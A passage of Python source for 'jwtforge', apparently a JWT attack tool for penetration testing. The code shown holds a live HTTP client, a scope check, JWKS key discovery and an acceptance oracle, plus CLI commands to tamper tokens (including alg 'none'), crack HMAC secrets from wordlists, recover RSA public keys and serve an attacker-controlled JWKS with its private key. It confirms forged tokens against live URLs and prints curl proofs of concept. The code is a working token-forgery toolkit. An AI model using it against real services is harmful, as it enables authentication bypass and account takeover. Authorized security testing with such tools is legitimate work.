            parts.append(f"-H {_shq(f'{k}: {v}')}")
        if self.req_body:
            parts.append(f"--data-raw {_shq(self.req_body)}")
        return " ".join(parts)


def _shq(s: str) -> str:
    return "'" + s.replace("'", "'\\''") + "'"


class LiveClient:
    def __init__(self, timeout: float = 15.0, verify_tls: bool = True, proxy: str | None = None):
        self.timeout = timeout
        self.verify_tls = verify_tls
        self.proxies = {"http": proxy, "https": proxy} if proxy else None

    def send(self, url: str, token: str, method: str = "GET",
             header: str = "Authorization: Bearer {{token}}",
             body: str | None = None, cookies: dict | None = None) -> Response:
        name, _, value = header.partition(":")
        headers = {name.strip(): value.strip().replace(PLACEHOLDER, token)}
        data = body.replace(PLACEHOLDER, token) if body else None
        r = requests.request(
            method.upper(), url, headers=headers, data=data, cookies=cookies,
            timeout=self.timeout, verify=self.verify_tls, proxies=self.proxies,
            allow_redirects=False,
        )
        return Response.from_requests(r)

    def send_template(self, template_path: str, token: str, base_url: str | None) -> Response:
        raw = Path(template_path).read_text(encoding="utf-8")
        raw = raw.replace("\r\n", "\n").replace("\r", "\n")
        raw = raw.replace(PLACEHOLDER, token)
        head, sep, body = raw.partition("\n\n")
        if not sep:
            body = ""
        lines = head.splitlines()
        if not lines or not lines[0].strip():
            raise ValueError("Empty request template.")
        parts = lines[0].split()
        method = parts[0]
        path = parts[1] if len(parts) > 1 else "/"
        headers: dict[str, str] = {}
        host_header = None
        for line in lines[1:]:
            if ":" not in line:
                continue
            k, _, v = line.partition(":")
            k, v = k.strip(), v.strip()
            if k.lower() == "content-length":
                continue
            if k.lower() == "host":
                host_header = v
            headers[k] = v
        if path.startswith(("http://", "https://")):
            url = path
        elif base_url:
            url = base_url.rstrip("/") + (path if path.startswith("/") else "/" + path)
        elif host_header:
            url = f"https://{host_header}{path}"
        else:
            raise ValueError("Cannot determine URL: pass --url or include a Host header.")
        r = requests.request(
            method.upper(), url, headers=headers,
            data=body.encode("utf-8") if body else None,
            timeout=self.timeout, verify=self.verify_tls, proxies=self.proxies,
            allow_redirects=False,
        )
        return Response.from_requests(r)


# =============================================================================
# LIVE — ORACLE
# =============================================================================

ACCEPTED = "ACCEPTED"
REJECTED = "REJECTED"
UNKNOWN = "UNKNOWN"


@dataclass
class Oracle:
    valid: Response | None = None
    invalid: Response | None = None
    success_marker: str | None = None
    failure_marker: str | None = None
    length_tolerance: float = 0.15

    def classify(self, resp: Response) -> str:
        return self.judge(resp)[0]

    def judge(self, resp: Response) -> tuple[str, str]:
        if self.success_marker is not None:
            if self.success_marker in resp.body:
                return ACCEPTED, f"success marker {self.success_marker!r} present in response body"
            return REJECTED, f"success marker {self.success_marker!r} absent from response body"
        if self.failure_marker is not None and self.failure_marker in resp.body:
            return REJECTED, f"failure marker {self.failure_marker!r} present in response body"
        if resp.status in (401, 403):
            return REJECTED, f"HTTP {resp.status} is an authorization rejection"
        if self.valid is not None:
            same_status = resp.status == self.valid.status
            if self.valid.length:
                ratio = abs(resp.length - self.valid.length) / max(self.valid.length, 1)
                close = ratio <= self.length_tolerance
            else:
                close = True
            if same_status and close:
                if self.invalid and resp.status == self.invalid.status and resp.length == self.invalid.length:
                    return REJECTED, "response is identical to the invalid-token baseline"
                return ACCEPTED, (
                    f"HTTP {resp.status} and length {resp.length} match the valid-token "
                    f"baseline (status {self.valid.status}, length {self.valid.length}) "
                    "and differ from the invalid-token baseline"
                )
            return REJECTED, (
                f"response (HTTP {resp.status}, length {resp.length}) differs from the "
                f"valid-token baseline (HTTP {self.valid.status}, length {self.valid.length})"
            )
        if 200 <= resp.status < 300:
            return ACCEPTED, f"HTTP {resp.status} with no baseline configured"
        return UNKNOWN, f"HTTP {resp.status}; cannot classify without a baseline"


# =============================================================================
# LIVE — SCOPE
# =============================================================================

class ScopeError(PermissionError):
    pass


class Scope:
    def __init__(self, authorized: bool = False, hosts: set[str] | None = None):
        self.authorized = authorized
        self.hosts = hosts or set()

    @classmethod
    def from_file(cls, path: str | None, authorized: bool = False) -> "Scope":
        hosts: set[str] = set()
        if path:
            for line in Path(path).read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    hosts.add(line.lower())
        return cls(authorized=authorized, hosts=hosts)

    def check(self, url: str) -> None:
        parsed = urlparse(url)
        host = (parsed.hostname or "").lower()
        netloc = parsed.netloc.lower()
        if self.hosts:
            if host not in self.hosts and netloc not in self.hosts:
                raise ScopeError(
                    f"{host!r} is not in the authorized scope file. Add it or confirm authorization."
                )
            return
        if not self.authorized:
            raise ScopeError(
                "Refusing to contact a live target without authorization. Pass "
                "--authorized (you confirm you have written permission to test "
                f"{host!r}) or supply --scope-file."
            )


# =============================================================================
# LIVE — JWKS DISCOVERY
# =============================================================================

STANDARD_PATHS = (
    "/.well-known/jwks.json", "/jwks.json", "/jwks",
    "/.well-known/openid-configuration", "/api/jwks.json", "/oauth/jwks",
)


def _origin(url: str) -> str:
    p = urlparse(url)
    if not p.scheme or not p.netloc:
        raise ValueError(f"cannot derive origin from URL: {url!r}")
    return f"{p.scheme}://{p.netloc}"


def _http_get(url: str, verify_tls: bool, proxy: str | None, timeout: float = 10.0):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    return requests.get(url, timeout=timeout, verify=verify_tls, proxies=proxies, allow_redirects=True)


def _fetch_jwks_doc(url: str, verify_tls: bool, proxy: str | None) -> dict | None:
    try:
        r = _http_get(url, verify_tls, proxy)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    try:
        doc = r.json()
    except (ValueError, json.JSONDecodeError):
        return None
    if isinstance(doc, dict) and "jwks_uri" in doc and "keys" not in doc:
        return _fetch_jwks_doc(doc["jwks_uri"], verify_tls, proxy)
    if isinstance(doc, dict) and "keys" in doc:
        return doc
    return None


def discover_public_key(
    target_url: str | None = None, jwks_url: str | None = None,
    kid: str | None = None, verify_tls: bool = True, proxy: str | None = None,
) -> tuple[bytes, str]:
    candidates: list[str] = []
    if jwks_url:
        candidates.append(jwks_url)
    if target_url:
        origin = _origin(target_url)
        candidates.extend(urljoin(origin, p) for p in STANDARD_PATHS)
    if not candidates:
        raise ValueError("need jwks_url or target_url to discover a key")
    for url in candidates:
        doc = _fetch_jwks_doc(url, verify_tls, proxy)
        if not doc:
            continue
        jwk = jwk_from_jwks(doc, kid=kid)
        pubkey = jwk_to_public(jwk)
        return public_pem(pubkey), url
    raise ValueError(
        "no JWK Set found at the standard endpoints "
        f"({', '.join(STANDARD_PATHS)}); pass --jwks-url explicitly if the path differs"
    )


# =============================================================================
# SCANNER
# =============================================================================

SKIPPED = "SKIPPED"


@dataclass
class CandidateResult:
    candidate: Candidate
    status: str = "GENERATED"
    http_status: int | None = None
    http_length: int | None = None
    reason: str = ""
    evidence: "Response | None" = None
    baseline_valid: "Response | None" = None
    baseline_invalid: "Response | None" = None
    error: str | None = None


@dataclass
class Finding:
    attack_id: str
    name: str
    severity: str
    cwe: str
    references: tuple[str, ...]
    results: list[CandidateResult] = field(default_factory=list)

    @property
    def confirmed(self) -> bool:
        return any(r.status == ACCEPTED for r in self.results)

    @property
    def skipped(self) -> bool:
        return bool(self.results) and all(r.status == SKIPPED for r in self.results)

    @property
    def note(self) -> str:
        return self.results[0].reason if self.skipped and self.results else ""


@dataclass
class LiveConfig:
    url: str
    header: str = "Authorization: Bearer {{token}}"
    method: str = "GET"
    body: str | None = None
    template: str | None = None
    invalid_token: str = "invalid.invalid.invalid"
    success_marker: str | None = None
    failure_marker: str | None = None
    verify_tls: bool = True
    proxy: str | None = None


def _oracle_baselines(client: LiveClient, cfg: LiveConfig, real_token: str) -> Oracle:
    def _send(tok: str):
        if cfg.template:
            return client.send_template(cfg.template, tok, cfg.url)
        return client.send(cfg.url, tok, method=cfg.method, header=cfg.header, body=cfg.body)
    valid = _send(real_token)
    invalid = _send(cfg.invalid_token)
    return Oracle(valid=valid, invalid=invalid, success_marker=cfg.success_marker, failure_marker=cfg.failure_marker)


def _check_baseline_health(oracle: Oracle, on_warn: Callable[[str], None]) -> None:
    v = oracle.valid
    if v is None:
        return
    if oracle.success_marker is None and v.status in (401, 403):
        on_warn(
            f"valid-token baseline returned HTTP {v.status}: the original token is "
            "itself rejected at this URL. Set --success-marker or point --url where the original token IS valid."
        )
    elif (
        oracle.success_marker is None and oracle.invalid is not None
        and v.status == oracle.invalid.status and v.length == oracle.invalid.length
    ):
        on_warn("valid-token and invalid-token baselines are identical; set --success-marker / --failure-marker.")


def _skip_finding(attack, reason: str) -> Finding:
    f = Finding(attack_id=attack.id, name=attack.meta.name, severity=attack.severity,
                cwe=attack.meta.cwe, references=attack.meta.references)
    f.results.append(CandidateResult(
        candidate=Candidate(token="", technique="skipped", detail=reason),
        status=SKIPPED, reason=reason,
    ))
    return f


def scan(
    jwt: JWT, ctx: AttackContext, live: LiveConfig | None = None, scope: Scope | None = None,
    only: list[str] | None = None, on_warn: Callable[[str], None] | None = None,
) -> list[Finding]:
    client = oracle = None
    if live:
        if scope:
            scope.check(live.url)
        client = LiveClient(verify_tls=live.verify_tls, proxy=live.proxy)
        oracle = _oracle_baselines(client, live, jwt.serialize())
        if on_warn:
            _check_baseline_health(oracle, on_warn)
    findings: list[Finding] = []
    for attack in all_attacks():
        if only and attack.id not in only:
            continue
        reason = attack.skip_reason(jwt, ctx)
        candidates = []
        if attack.applicable(jwt, ctx):
            try:
                candidates = attack.generate(jwt, ctx)
            except Exception:
                candidates = []
        if not candidates:
            if reason:
                findings.append(_skip_finding(attack, reason))
            continue
        finding = Finding(attack_id=attack.id, name=attack.meta.name, severity=attack.severity,
                          cwe=attack.meta.cwe, references=attack.meta.references)
        for cand in candidates:
            res = CandidateResult(candidate=cand)
            if client and oracle:
                try:
                    if live.template:
                        resp = client.send_template(live.template, cand.token, live.url)
                    else:
                        resp = client.send(live.url, cand.token, method=live.method,
                                           header=live.header, body=live.body)
                    verdict, reason = oracle.judge(resp)
                    res.status = verdict
                    res.reason = reason
                    res.http_status = resp.status
                    res.http_length = resp.length
                    res.evidence = resp
                    res.baseline_valid = oracle.valid
                    res.baseline_invalid = oracle.invalid
                except Exception as exc:
                    res.status = UNKNOWN
                    res.error = f"{type(exc).__name__}: {exc}"
            finding.results.append(res)
        findings.append(finding)
    return findings


# =============================================================================
# JWKS SERVER
# =============================================================================

def _make_handler(jwks: dict[str, Any]):
    body = json.dumps(jwks).encode("utf-8")

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, fmt, *args):
            return

    return Handler


class JwksServer:
    def __init__(self, jwks: dict[str, Any], host: str = "0.0.0.0", port: int = 8000):
        self.jwks = jwks
        self._httpd = ThreadingHTTPServer((host, port), _make_handler(jwks))
        self.host = host
        self.port = self._httpd.server_address[1]
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        self._thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._httpd.shutdown()
        self._httpd.server_close()

    @property
    def url(self) -> str:
        host = "127.0.0.1" if self.host in ("0.0.0.0", "") else self.host
        return f"http://{host}:{self.port}/.well-known/jwks.json"

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *exc):
        self.stop()


def serve_forever(jwks: dict[str, Any], host: str = "0.0.0.0", port: int = 8000) -> None:
    srv = JwksServer(jwks, host, port)
    print(f"[jwtforge] Serving JWKS at http://{host}:{srv.port}/.well-known/jwks.json")
    srv.start()
    try:
        while True:
            threading.Event().wait(3600)
    except KeyboardInterrupt:
        srv.stop()


# =============================================================================
# REPORT
# =============================================================================

_SEV_STYLE = {
    "critical": "bold white on red", "high": "bold red",
    "medium": "yellow", "low": "cyan", "info": "dim",
}


def _rank(f: Finding) -> int:
    if f.confirmed:
        return 0
    if getattr(f, "skipped", False):
        return 2
    return 1


def _sorted_findings(findings: list[Finding]) -> list[Finding]:
    return sorted(findings, key=lambda f: (_rank(f), SEVERITY_ORDER.get(f.severity, 99)))


_INTERESTING_REQ_HEADERS = ("authorization", "cookie", "content-type", "x-api-key")


def _fmt_request(resp) -> str:
    lines = [f"{resp.method} {resp.url}"]
    for k, v in resp.req_headers.items():
        if k.lower() in _INTERESTING_REQ_HEADERS:
            lines.append(f"{k}: {v}")
    if resp.req_body:
        lines.append("")
        lines.append(resp.req_body)
    return "\n".join(lines)


def _fmt_response(resp) -> str:
    ct = resp.headers.get("Content-Type") or resp.headers.get("content-type", "")
    head = f"HTTP {resp.status}  ({resp.length} bytes)  {ct}".rstrip()
    body = resp.body.strip()
    return head + (("\n" + body) if body else "")


def _print_evidence(con, r) -> None:
    if r.error:
        con.print(f"  [red]request error:[/] {r.error}")
        return
    if r.evidence is None:
        return
    con.print("  [bold]request sent:[/]")
    for line in _fmt_request(r.evidence).splitlines():
        con.print(f"    [dim]{line}[/]")
    con.print("  [bold]response received:[/]")
    for line in _fmt_response(r.evidence).splitlines():
        con.print(f"    [dim]{line}[/]")
    if r.baseline_valid is not None:
        bv, bi = r.baseline_valid, r.baseline_invalid
        base = f"valid-token baseline HTTP {bv.status} ({bv.length} B)"
        if bi is not None:
            base += f"  |  invalid-token baseline HTTP {bi.status} ({bi.length} B)"
        con.print(f"  [bold]baseline:[/] {base}")
    con.print(f"  [bold]PoC (curl):[/] {r.evidence.as_curl()}")


def _evidence_dict(r) -> dict | None:
    if r.evidence is None and r.error is None:
        return None
    if r.error:
        return {"error": r.error}
    e = r.evidence
    out = {
        "request": {"method": e.method, "url": e.url, "headers": e.req_headers, "body": e.req_body},
        "response": {"status": e.status, "length": e.length, "headers": e.headers, "body": e.body},
        "poc_curl": e.as_curl(),
    }
    if r.baseline_valid is not None:
        out["baseline_valid"] = {"status": r.baseline_valid.status, "length": r.baseline_valid.length}
    if r.baseline_invalid is not None:
        out["baseline_invalid"] = {"status": r.baseline_invalid.status, "length": r.baseline_invalid.length}
    return out


def print_console(findings: list[Finding], live: bool, console: Console | None = None) -> None:
    con = console or Console()
    table = Table(title="jwtforge - JWT attack results", show_lines=False, expand=True)
    table.add_column("Severity", no_wrap=True)
    table.add_column("Attack")
    table.add_column("Candidates", justify="right")
    if live:
        table.add_column("Status", no_wrap=True)
    table.add_column("CWE", no_wrap=True)
    for f in _sorted_findings(findings):
        sev = f"[{_SEV_STYLE.get(f.severity,'')}] {f.severity.upper()} [/]"
        skipped = getattr(f, "skipped", False)
        name_cell = f.name
        if skipped:
            name_cell = f"{f.name}\n[dim]skipped - {f.note}[/]"
        row = [sev, name_cell, "-" if skipped else str(len(f.results))]
        if live:
            if skipped:
                row.append("[dim]skipped[/]")
            elif f.confirmed:
                row.append("[bold white on red] CONFIRMED [/]")
            elif any(r.status == "UNKNOWN" for r in f.results):
                row.append("[yellow]UNKNOWN[/]")
            else:
                row.append("[green]not accepted[/]")
        row.append(f.cwe)
        table.add_row(*row)
    con.print(table)
    if not live:
        for f in _sorted_findings(findings):
            if getattr(f, "skipped", False):
                con.print(f"[dim]skipped {f.name}: {f.note}[/]")
    for f in _sorted_findings(findings):
        highlights = [r for r in f.results if r.status == "ACCEPTED" or r.candidate.secret]
        if not highlights:
            continue
        con.rule(f"[{_SEV_STYLE.get(f.severity,'')}] {f.name} - {f.severity.upper()} [/]")
        for r in highlights:
            tag = "[bold white on red] CONFIRMED [/]" if r.status == "ACCEPTED" else "[cyan]candidate[/]"
            con.print(f"{tag} {r.candidate.technique}")
            if r.candidate.detail:
                con.print(f"  {r.candidate.detail}")
            if r.candidate.secret:
                con.print(f"  [bold]secret:[/] [bold green]{r.candidate.secret}[/]")
            if r.reason:
                con.print(f"  [bold]why:[/] {r.reason}")
            con.print(f"  [bold]forged token:[/] {r.candidate.token}")
            _print_evidence(con, r)


def to_dict(findings: list[Finding]) -> dict:
    out = []
    for f in _sorted_findings(findings):
        out.append({
            "attack_id": f.attack_id, "name": f.name, "severity": f.severity,
            "cwe": f.cwe, "references": list(f.references), "confirmed": f.confirmed,
            "skipped": getattr(f, "skipped", False), "note": getattr(f, "note", ""),
            "candidates": [{
                "technique": r.candidate.technique, "detail": r.candidate.detail,
                "token": r.candidate.token, "secret": r.candidate.secret,
                "status": r.status, "reason": r.reason,
                "http_status": r.http_status, "http_length": r.http_length,
                "evidence": _evidence_dict(r),
            } for r in f.results],
        })
    return {"findings": out}


def to_json(findings: list[Finding], indent: int = 2) -> str:
    return json.dumps(to_dict(findings), indent=indent)


import html as _html


def to_html(findings: list[Finding]) -> str:
    rows = []
    for f in _sorted_findings(findings):
        if getattr(f, "skipped", False):
            rows.append(
                f"<section class='sev-{f.severity} skipped'>"
                f"<h2>{_html.escape(f.name)} <span class='sev'>{f.severity.upper()}</span> "
                f"<span class='skip'>SKIPPED</span></h2>"
                f"<p>{_html.escape(f.cwe)}</p>"
                f"<p class='why'>{_html.escape(f.note)}</p></section>"
            )
            continue
        badge = "CONFIRMED" if f.confirmed else ""
        items = []
        for r in f.results:
            status_tag = f" <b>[{r.status}]</b>" if r.status != "GENERATED" else ""
            ev = ""
            if r.status == "ACCEPTED" or r.candidate.secret:
                ev_parts = []
                if r.reason:
                    ev_parts.append(f"<div class='why'><b>why:</b> {_html.escape(r.reason)}</div>")
                if r.candidate.secret:
                    ev_parts.append(f"<div class='why'><b>secret:</b> <code>{_html.escape(str(r.candidate.secret))}</code></div>")
                if r.error:
                    ev_parts.append(f"<div class='why'><b>error:</b> {_html.escape(r.error)}</div>")
                elif r.evidence is not None:
                    ev_parts.append(f"<div class='lbl'>request sent</div><pre>{_html.escape(_fmt_request(r.evidence))}</pre>")
                    ev_parts.append(f"<div class='lbl'>response received</div><pre>{_html.escape(_fmt_response(r.evidence))}</pre>")
                    if r.baseline_valid is not None:
                        b = f"valid baseline HTTP {r.baseline_valid.status} ({r.baseline_valid.length} B)"
                        if r.baseline_invalid is not None:
                            b += f" | invalid baseline HTTP {r.baseline_invalid.status} ({r.baseline_invalid.length} B)"
                        ev_parts.append(f"<div class='why'><b>baseline:</b> {_html.escape(b)}</div>")
                    ev_parts.append(f"<div class='lbl'>PoC (curl)</div><pre>{_html.escape(r.evidence.as_curl())}</pre>")
                ev = "".join(ev_parts)
            items.append(
                f"<li><code>{_html.escape(r.candidate.technique)}</code>{status_tag}"
                f"<div class='tok'>{_html.escape(r.candidate.token)}</div>{ev}</li>"
            )
        cands = "".join(items)
        rows.append(
            f"<section class='sev-{f.severity}'>"
            f"<h2>{_html.escape(f.name)} <span class='sev'>{f.severity.upper()}</span> "
            f"<span class='badge'>{badge}</span></h2>"
            f"<p>{_html.escape(f.cwe)}</p><ul>{cands}</ul></section>"
        )
    style = """
    body{font-family:system-ui,Segoe UI,Arial,sans-serif;margin:2rem;background:#0f1220;color:#e7e9f3}
    h1{margin-top:0}
    section{border-left:4px solid #555;padding:.5rem 1rem;margin:1rem 0;background:#171a2b;border-radius:6px}
    .sev-critical{border-color:#e5484d}.sev-high{border-color:#f5a623}.sev-medium{border-color:#e2c541}
    .sev-low{border-color:#3aa0ff}.sev{font-size:.7rem;padding:.1rem .4rem;border-radius:4px;background:#333}
    .badge{color:#fff;background:#e5484d;padding:.1rem .4rem;border-radius:4px;font-size:.7rem}
    .badge:empty{display:none}
    .skip{color:#0f1220;background:#8b93a1;padding:.1rem .4rem;border-radius:4px;font-size:.7rem}
    section.skipped{opacity:.65;border-color:#8b93a1}
    .tok{word-break:break-all;font-family:ui-monospace,monospace;font-size:.75rem;color:#9aa4d0;margin:.2rem 0}
    code{color:#8ce99a}
    .lbl{font-size:.7rem;text-transform:uppercase;letter-spacing:.05em;color:#f5a623;margin-top:.4rem}
    .why{font-size:.8rem;color:#cdd3f0;margin:.2rem 0}
    pre{white-space:pre-wrap;word-break:break-all;background:#0b0e1a;border:1px solid #2a2f45;border-radius:4px;padding:.4rem .6rem;font-size:.72rem;color:#c8d0f5;margin:.2rem 0}
    """
    return (
        "<!doctype html><html><head><meta charset='utf-8'>"
        "<title>jwtforge report</title><style>" + style + "</style></head><body>"
        "<h1>jwtforge — JWT attack report</h1>" + "".join(rows) + "</body></html>"
    )


# =============================================================================
# CLI
# =============================================================================

console = Console()


def _parse_claims(pairs: tuple[str, ...]) -> dict:
    out: dict = {}
    for p in pairs:
        if "=" not in p:
            raise click.BadParameter(f"claim must be key=value: {p!r}")
        k, _, v = p.partition("=")
        try:
            out[k] = _json.loads(v)
        except ValueError:
            out[k] = v
    return out


def _load_token(token: str) -> JWT:
    if token == "-":
        token = sys.stdin.read().strip()
    elif len(token) < 260 and Path(token).exists():
        token = Path(token).read_text(encoding="utf-8").strip()
    try:
        return JWT.parse(token)
    except ValueError as exc:
        raise click.ClickException(str(exc))


@click.group()
@click.version_option("0.1.0", prog_name="jwtforge")
def main() -> None:
    """jwtforge - JWT web-auth testing for authorized penetration testing."""


@main.command()
@click.argument("token")
def decode(token: str) -> None:
    """Decode a token and flag obvious weaknesses."""
    jwt = _load_token(token)
    console.print("[bold]Header[/]")
    console.print(Syntax(_json.dumps(jwt.header, indent=2), "json", background_color="default"))
    console.print("[bold]Payload[/]")
    console.print(Syntax(_json.dumps(jwt.payload, indent=2), "json", background_color="default"))
    console.print(f"[bold]Signature[/]: {len(jwt.signature)} bytes")
    notes = []
    if jwt.alg.lower() == "none":
        notes.append("[red]alg is 'none' - unsigned token[/]")
    if jwt.alg.startswith("HS"):
        notes.append("HS* symmetric - try secret cracking (jwtforge crack)")
    if jwt.alg.startswith(("RS", "ES", "PS")):
        notes.append("asymmetric - try alg-confusion with the public key")
    if "exp" not in jwt.payload:
        notes.append("[yellow]no 'exp' claim - token may not expire[/]")
    for h in ("jku", "jwk", "x5u", "x5c", "kid"):
        if h in jwt.header:
            notes.append(f"header has '{h}' - injection surface")
    for n in notes:
        console.print(f"  - {n}")


@main.command()
@click.argument("token")
@click.option("--claim", "claims", multiple=True, help="key=value (repeatable, JSON values ok)")
@click.option("--alg", help="override the alg header (e.g. none)")
@click.option("--secret", help="HMAC secret to (re)sign with, if alg is HS*")
def tamper(token: str, claims: tuple[str, ...], alg: str | None, secret: str | None) -> None:
    """Forge a single modified token."""
    jwt = _load_token(token)
    jwt.payload.update(_parse_claims(claims))
    if alg:
        jwt.header["alg"] = alg
    if jwt.alg.lower() == "none":
        jwt.signature = b""
    elif secret is not None and jwt.alg.startswith("HS"):
        jwt.signature = sign(jwt, secret=secret.encode())
    click.echo(jwt.serialize())


@main.command()
@click.argument("token")
@click.option("--wordlist", "-w", required=True, type=click.Path(exists=True))
@click.option("--hashcat", "use_hashcat", is_flag=True, help="hand off to hashcat mode 16500")
def crack(token: str, wordlist: str, use_hashcat: bool) -> None:
    """Recover a weak HS* secret from a wordlist."""
    jwt = _load_token(token)
    if not jwt.alg.startswith("HS"):
        raise click.ClickException(f"Token alg is {jwt.alg!r}, not HS*.")
    console.print(f"Cracking {jwt.alg} against {wordlist} ...")
    secret = run_hashcat(jwt, wordlist) if use_hashcat else crack_hmac(jwt, wordlist)
    if secret:
        console.print(f"[bold green]Secret found:[/] {secret!r}")
    else:
        console.print("[yellow]No secret found in wordlist.[/]")
        raise SystemExit(1)


@main.command("list")
def list_cmd() -> None:
    """List available attacks."""
    for a in all_attacks():
        console.print(f"  [bold]{a.id}[/] - {a.meta.name} ([{a.severity}]{a.severity}[/], {a.meta.cwe})")


def _acquire_public_key(ctx, jwt, second_token, jwks_url, url, insecure, proxy) -> None:
    if second_token:
        console.print("[*] recovering public key from two tokens (sig2n)...")
        if not HAVE_GMPY2:
            console.print(
                "[yellow]  gmpy2 not installed - this can take minutes for 2048-bit keys. "
                "'pip install gmpy2' to speed it up.[/]"
            )
        try:
            cands = recover_public_key(jwt.serialize(), _load_token(second_token).serialize())
        except ValueError as exc:
            console.print(f"[yellow]  recovery not possible: {exc}[/]")
            return
        if not cands:
            console.print("[yellow]  no candidate keys recovered.[/]")
            return
        best = next((c for c in cands if c.verified), cands[0])
        ctx.public_key_pem = best.pem_spki()
        tag = "verified" if best.verified else "UNVERIFIED (try each candidate manually)"
        console.print(f"[green]  recovered {best.bits}-bit RSA public key ({tag}).[/]")
        return
    if jwks_url or url:
        try:
            pem, src = discover_public_key(
                target_url=url, jwks_url=jwks_url, kid=jwt.header.get("kid"),
                verify_tls=not insecure, proxy=proxy,
            )
        except ValueError as exc:
            console.print(f"[yellow][!] public key not auto-fetched: {exc}[/]")
            return
        ctx.public_key_pem = pem
        console.print(f"[green][+] fetched public key from {src} (enables algorithm confusion)[/]")


def _build_ctx(claims, public_key, jku_url, wordlist, use_hashcat, kid_payload,
               refresh_exp: bool = True) -> AttackContext:
    pem = Path(public_key).read_bytes() if public_key else None
    return AttackContext(
        public_key_pem=pem, jku_url=jku_url, wordlist=wordlist, use_hashcat=use_hashcat,
        claims=_parse_claims(claims), kid_payloads=list(kid_payload), refresh_exp=refresh_exp,
    )


@main.command()
@click.argument("attack_id")
@click.argument("token")
@click.option("--claim", "claims", multiple=True)
@click.option("--public-key", type=click.Path(exists=True))
@click.option("--jku-url")
@click.option("--wordlist", "-w", type=click.Path(exists=True))
@click.option("--hashcat", "use_hashcat", is_flag=True)
@click.option("--kid-payload", multiple=True)
def attack(attack_id, token, claims, public_key, jku_url, wordlist, use_hashcat, kid_payload) -> None:
    """Run one attack and print its candidate tokens."""
    if attack_id not in list_ids():
        raise click.ClickException(f"Unknown attack {attack_id!r}. Try: {', '.join(list_ids())}")
    jwt = _load_token(token)
    ctx = _build_ctx(claims, public_key, jku_url, wordlist, use_hashcat, kid_payload)
    atk = get_attack(attack_id)
    cands = atk.generate(jwt, ctx)
    if not cands:
        console.print("[yellow]No candidates produced (missing options?).[/]")
        return
    for c in cands:
        console.print(f"[bold]{c.technique}[/]")
        if c.detail:
            console.print(f"  {c.detail}")
        click.echo(c.token)


@main.command("jwks")
@click.option("--url", help="target base URL; standard JWKS paths are probed")
@click.option("--jwks-url", help="explicit JWKS endpoint")
@click.option("--kid", help="select the key with this kid (default: first)")
@click.option("--insecure", is_flag=True)
@click.option("--proxy")
@click.option("--out", type=click.Path(), help="write the PEM here")
def jwks_cmd(url, jwks_url, kid, insecure, proxy, out) -> None:
    """Fetch a server's public key from its JWKS endpoint and print it as PEM."""
    if not url and not jwks_url:
        raise click.ClickException("pass --url or --jwks-url")
    try:
        pem, src = discover_public_key(
            target_url=url, jwks_url=jwks_url, kid=kid, verify_tls=not insecure, proxy=proxy
        )
    except ValueError as exc:
        raise click.ClickException(str(exc))
    console.print(f"[green]source:[/] {src}")
    if out:
        Path(out).write_bytes(pem)
        console.print(f"[green]PEM written to {out}[/]")
    else:
        click.echo(pem.decode())
    console.print("[bold]base64(PEM)[/] (for Burp JWT Editor symmetric 'k'):")
    click.echo(_b64.b64encode(pem).decode())


@main.command("recover-pubkey")
@click.argument("token1")
@click.argument("token2")
@click.option("--out", type=click.Path(), help="write the recovered PEM here")
def recover_pubkey_cmd(token1, token2, out) -> None:
    """Recover the RSA public key from two RS* tokens (no exposed key needed)."""
    if not HAVE_GMPY2:
        console.print("[yellow]gmpy2 not installed - may take minutes for 2048-bit keys.[/]")
    try:
        cands = recover_public_key(_load_token(token1).serialize(), _load_token(token2).serialize())
    except ValueError as exc:
        raise click.ClickException(str(exc))
    if not cands:
        raise click.ClickException("no candidate keys recovered (are both tokens from the same RS* key?)")
    for i, c in enumerate(cands):
        tag = "[green]VERIFIED[/]" if c.verified else "[yellow]candidate[/]"
        console.print(f"{tag} #{i+1}: e={c.e}, {c.bits}-bit")
        click.echo(c.pem_spki().decode())
        console.print(f"[dim]base64(X.509 DER): {c.der_spki_b64()}[/]")
    best = next((c for c in cands if c.verified), cands[0])
    if out:
        Path(out).write_bytes(best.pem_spki())
        console.print(f"[green]best key PEM written to {out}[/]")
    console.print(
        "[bold]next:[/] python jwtforge.py scan <token> --public-key <pem> --claim sub=administrator "
        "--url <target> --success-marker <admin-only-text>"
    )


@main.command("serve-jwks")
@click.option("--host", default="0.0.0.0")
@click.option("--port", default=8000, type=int)
@click.option("--out", type=click.Path(), help="write the matching private key PEM here")
def serve_jwks_cmd(host, port, out) -> None:
    """Serve an attacker JWKS (for jku/x5u attacks) and print the private key."""
    priv = generate_rsa(2048)
    jwks = jwks_for(priv.public_key(), kid="jwtforge")
    pem = private_pem(priv)
    if out:
        Path(out).write_bytes(pem)
        console.print(f"Private key written to {out}")
    else:
        console.print("[bold]Private key (sign your token with this):[/]")
        click.echo(pem.decode())
    serve_forever(jwks, host=host, port=port)


@main.command("scan")
@click.argument("token")
@click.option("--claim", "claims", multiple=True)
@click.option("--public-key", type=click.Path(exists=True))
@click.option("--jwks-url", help="JWKS endpoint to fetch the public key from (alg confusion)")
@click.option("--second-token", help="a second server-issued JWT; recovers the public key via sig2n")
@click.option("--jku-url")
@click.option("--wordlist", "-w", type=click.Path(exists=True))
@click.option("--hashcat", "use_hashcat", is_flag=True)
@click.option("--kid-payload", multiple=True)
@click.option("--only", multiple=True, help="restrict to specific attack ids")
@click.option("--no-refresh-exp", is_flag=True, help="do NOT auto-bump exp on forged tokens")
@click.option("--url", help="live target URL to confirm findings against")
@click.option("--header", default="Authorization: Bearer {{token}}", show_default=True)
@click.option("--method", default="GET", show_default=True)
@click.option("--body")
@click.option("--template", type=click.Path(exists=True), help="raw HTTP request with {{token}}")
@click.option("--success-marker", help="response substring meaning 'authorized'")
@click.option("--failure-marker", help="response substring meaning 'rejected'")
@click.option("--authorized", is_flag=True, help="confirm you are permitted to test --url")
@click.option("--scope-file", type=click.Path(exists=True))
@click.option("--insecure", is_flag=True, help="skip TLS verification")
@click.option("--proxy", help="http(s) proxy, e.g. http://127.0.0.1:8080")
@click.option("--json", "json_out", type=click.Path(), help="write JSON report")
